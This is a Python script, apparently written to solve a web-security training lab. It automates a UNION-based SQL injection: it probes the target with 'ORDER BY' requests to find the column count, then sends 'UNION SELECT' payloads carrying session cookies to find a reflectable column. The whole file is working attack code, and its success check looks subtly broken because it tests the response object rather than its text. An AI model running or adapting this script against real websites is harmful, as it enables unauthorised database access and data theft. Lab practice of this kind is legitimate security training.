```python
import requests
import sys

#Parsing responses to get the string to be injected
def parseString(url):
    print("[-] Parsing the string to be injected...")
    response = requests.get(URL)
    index = response.text.find("string:")
    string = response.text[index + 9 : index + 15]
    sess_cookie = response.cookies["session"]
    print(f"[+] Found string : {string}")
    return response, string, sess_cookie

#generates payload to be injected
def makePayload(index, cols, string):
    nulls = cols * "null,"
    nulls = nulls.split(",")
    nulls[index] = "'" + string + "'"
    payload = ''
    for char in nulls:
        payload += char + ","
    payload = payload[:-2]
    return payload

#Parsing CLI arguments
if len(sys.argv) != 2:
    print(f"[+] USAGE : {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

URL = sys.argv[1]

#Getting number of columns in the original query
i = 1
cols = 0
print("[-] Determining No. of columns...")
while True:
    response = requests.get(URL + "'+ORDER+BY+" + str(i) + "+--+-+")
    if response.status_code != 200:
        cols = i - 1
        break
    i += 1
print(f"[+] No. of columns : {cols}")

#Trying different indexes to inject the payload
print("[-] Trying different indexes to inject the found string...")
for i in range(cols):
    response, string, sess_cookie = parseString(URL)
    payload = makePayload(i, cols, string)
    print(f"[-] Trying index {i}; payload = {payload}")
    resp_tmp = requests.get(URL + "'+UNION+SELECT+" + payload + "+--+-+", headers = {"Cookie":"session="+sess_cookie})
    print(resp_tmp.text)
    if "Internal Server Error" not in resp_tmp:
        print("[+] SQLi successful!!!")
#THANK YOU
```